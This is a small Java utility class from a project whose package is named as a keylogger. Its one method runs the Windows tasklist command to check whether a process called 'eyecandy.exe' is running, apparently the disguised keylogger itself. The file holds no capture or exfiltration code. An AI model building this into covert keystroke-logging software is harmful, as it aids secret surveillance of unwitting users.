package com.badar.keylogger.Utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ProcessUtils {
    public static boolean isProcessVisible() {
        String processName = "eyecandy.exe";
        try {
            Process process = Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq " + processName + "\"");
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains(processName)) {
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }
}